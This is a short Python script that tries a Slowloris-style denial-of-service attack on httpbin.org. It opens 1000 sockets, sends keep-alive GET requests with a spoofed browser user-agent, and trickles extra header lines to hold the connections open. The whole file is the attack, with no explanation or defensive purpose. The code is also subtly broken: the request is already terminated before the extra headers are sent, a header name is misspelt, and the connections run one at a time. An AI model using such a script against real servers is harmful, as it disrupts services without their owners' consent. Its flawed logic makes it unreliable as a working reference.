import socket
import time
import urllib.parse

if __name__ == '__main__':

    sockets = []
    for i in range(0, 1000):
        sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

    HOST = 'httpbin.org'
    PORT = 80


    message = b"GET / HTTP/1.1 \r\n" + \
              b"User-agent: Version/7.0.3 Safari/7046A194A \r\n" + \
              b"HOST: httpbin.org \r\n" + \
              b"Accept: */* \r\n" + \
              b"Conection: keep-alive \r\n" + \
              b"\r\n" + \
              b"\r\n"

    for sock in sockets:
        try:
            sock.connect((HOST, PORT))
            sock.send(message)
            sock.send(b"X-a: b \r\n")
            info = sock.recv(8192)
            print(info)
            time.sleep(1)
            sock.send(b"X-a: b \r\n")
        except:
            continue
        sock.close()
